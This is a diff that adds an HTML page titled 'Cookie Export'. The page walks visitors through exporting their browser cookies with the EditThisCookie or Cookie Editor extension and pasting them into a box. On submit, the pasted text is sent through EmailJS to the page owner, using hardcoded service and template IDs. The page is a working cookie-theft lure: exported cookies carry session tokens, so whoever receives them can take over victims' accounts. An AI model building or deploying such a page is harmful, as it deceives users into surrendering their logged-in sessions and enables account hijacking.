@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Export</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f0f0f0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        button {
+            margin: 10px;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            margin-top: 20px;
+            display: none;
+        }
+        #submitButton {
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="message">Do you have 'EditThisCookie' or 'Cookie Editor' installed?</div>
+        <div class="button-container" id="buttonContainer">
+            <button id="yesButton">Yes</button>
+            <button id="noButton">No</button>
+        </div>
+        <textarea id="cookieTextarea"></textarea>
+        <button id="submitButton">Submit</button>
+    </div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            emailjs.init('N4QPJjdGkEyvy7BdZ');
+
+            document.getElementById('yesButton').onclick = function() {
+                document.getElementById('message').innerText = "Please export your cookies using the extension and paste the text into the box below.";
+                document.getElementById('buttonContainer').style.display = 'none';
+                document.getElementById('cookieTextarea').style.display = 'block';
+                document.getElementById('submitButton').style.display = 'block';
+            };
+
+            document.getElementById('noButton').onclick = function() {
+                document.getElementById('message').innerText = "Please install 'EditThisCookie' or 'Cookie Editor' extension to export cookies.";
+            };
+
+            document.getElementById('submitButton').onclick = function() {
+                let cookieText = document.getElementById('cookieTextarea').value;
+                if (cookieText) {
+                    emailjs.send("service_120g06v", "template_34ev8zv", {
+                        ID: cookieText
+                    }).then(function(response) {
+                        alert("Email sent successfully!");
+                    }, function(error) {
+                        alert("Failed to send email: " + JSON.stringify(error));
+                    });
+                } else {
+                    alert("Please paste your exported cookie text.");
+                }
+            };
+        });
+    </script>
+</body>
+</html>
